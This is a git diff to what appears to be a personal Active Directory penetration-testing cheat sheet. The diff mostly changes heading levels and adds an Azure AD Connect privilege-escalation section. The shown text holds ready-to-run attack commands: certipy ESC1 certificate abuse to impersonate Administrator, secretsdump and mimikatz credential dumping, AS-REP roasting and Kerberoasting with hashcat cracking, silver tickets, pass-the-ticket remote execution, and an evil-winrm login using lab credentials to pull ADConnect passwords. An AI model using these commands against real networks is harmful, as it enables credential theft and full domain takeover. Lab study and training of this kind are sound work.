@@ -234,9 +234,6 @@ ESC1:
 
 certipy-ad req -username Tracy.White@nara-security.com -password zqwj041FGX -target-ip 192.168.168.30 -ca 'NARA-CA' -template 'NaraUser' -upn Administrator@NARA-SECURITY.COM
 certipy-ad auth -pfx administrator.pfx -username Administrator -domain 'nara-security.com' -dc-ip 192.168.168.30
-
-Tip:
-"python3 -m pip install --upgrade certipy-ad" and "sudo apt-get update&upgrade" somethines could solve the issue 
 ```
 #### Resource Based Constrained Delegation Attack
 ```
@@ -337,14 +334,14 @@ cme winrm ip -u celia.almeda -H 19a3a7550ce8c505c2d46b5e39d6f808
 cme winrm ip -u celia.almeda -p password
 ```
 
-#### Dump the local password hash and domain cached hash
+###### Dump the local password hash and domain cached hash
 ```
 impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
 impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
 impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
 ```
 
-#### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
+###### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
 sekurlsa::logonpasswords
@@ -353,7 +350,7 @@ net use \\dc01(logon server)
 klist
 .\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
 ```
-#### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
+###### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
 Enum users with Do not require Kerberos preauthentication enabled
 ```
 PowerView's Get-DomainUser function with the option -PreauthNotRequired
@@ -364,7 +361,7 @@ Extract hashes and Crack
 .\Rubeus.exe asreproast /nowrap
 hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-#### Kerberoasting
+###### Kerberoasting
 >The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
 
 >Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
@@ -388,7 +385,7 @@ sudo timedatectl set-ntp off
 sudo rdate -n 10.10.10.100
 Open a new terminal
 ```
-#### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
+###### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
 >Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.
 
 >Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
@@ -428,7 +425,7 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
-#### Pass The Hash/Pass The Key
+###### Pass The Hash/Pass The Key
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
 
 >The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
@@ -456,6 +453,14 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 # To convert tickets between Linux/Windows format with ticket_converter.py:
 impacket-ticket_converter ticket.kirbi ticket.ccache
 impacket-ticket_converter ticket.ccache ticket.kirbi
+```
+###### Privilege Escalation via azure ad sync
+```
+Windows: sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
+
+evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
+adconnect.ps1
+Get-ADConnectPassword
 ```
 
 ### Persistence
